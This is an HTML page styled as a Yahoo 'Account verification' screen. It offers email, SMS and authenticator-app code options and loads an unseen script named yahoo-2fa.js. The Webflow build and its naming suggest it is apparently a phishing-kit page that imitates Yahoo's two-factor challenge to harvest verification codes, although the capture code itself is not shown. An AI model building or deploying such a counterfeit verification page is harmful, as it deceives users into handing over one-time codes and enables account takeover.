<!DOCTYPE html>
<html data-wf-page="yahoo-2fa" data-wf-site="yahoo">
<head>
  <meta charset="utf-8">
  <title>Account Verification - Yahoo</title>
  <meta content="Verify your Yahoo account" name="description">
  <meta content="Account Verification - Yahoo" property="og:title">
  <meta content="Verify your Yahoo account" property="og:description">
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="webflow-yahoo.css" rel="stylesheet" type="text/css">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({  google: {    families: ["Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]  }});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="https://uploads-ssl.webflow.com/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link href="https://uploads-ssl.webflow.com/img/webclip.png" rel="apple-touch-icon">
</head>
<body>
  <div class="yahoo-container">
    <div class="yahoo-logo">
      <h1>yahoo!</h1>
    </div>
    
    <div class="text-center" style="margin-bottom: 30px;">
      <h2 style="font-size: 24px; margin: 0 0 10px 0; color: #333;">Account verification</h2>
      <p style="color: #666; margin: 0;">We need to verify your identity for account security</p>
    </div>

    <div id="error-message" class="error-message"></div>

    <form id="challenge-form" class="yahoo-form" method="POST">
      <div style="margin-bottom: 20px;">
        <label style="display: block; margin-bottom: 15px; padding: 15px; border: 2px solid #e1e1e1; border-radius: 6px; cursor: pointer; transition: border-color 0.3s;">
          <input type="radio" name="challenge" value="email" style="margin-right: 10px;" checked>
          <strong>Email verification</strong><br>
          <span style="color: #666; font-size: 14px;">We'll send a code to your email address</span>
        </label>
        
        <label style="display: block; margin-bottom: 15px; padding: 15px; border: 2px solid #e1e1e1; border-radius: 6px; cursor: pointer; transition: border-color 0.3s;">
          <input type="radio" name="challenge" value="sms" style="margin-right: 10px;">
          <strong>Text message (SMS)</strong><br>
          <span style="color: #666; font-size: 14px;">We'll send a code to your phone number</span>
        </label>
        
        <label style="display: block; margin-bottom: 15px; padding: 15px; border: 2px solid #e1e1e1; border-radius: 6px; cursor: pointer; transition: border-color 0.3s;">
          <input type="radio" name="challenge" value="app" style="margin-right: 10px;">
          <strong>Authenticator app</strong><br>
          <span style="color: #666; font-size: 14px;">Use your authenticator app to get a code</span>
        </label>
      </div>
      
      <button type="submit" id="submit-btn" class="yahoo-button">
        Continue
      </button>
    </form>

    <div class="text-center">
      <a href="#" class="yahoo-link">Try another way</a>
    </div>
  </div>

  <script src="yahoo-2fa.js"></script>
</body>
</html>
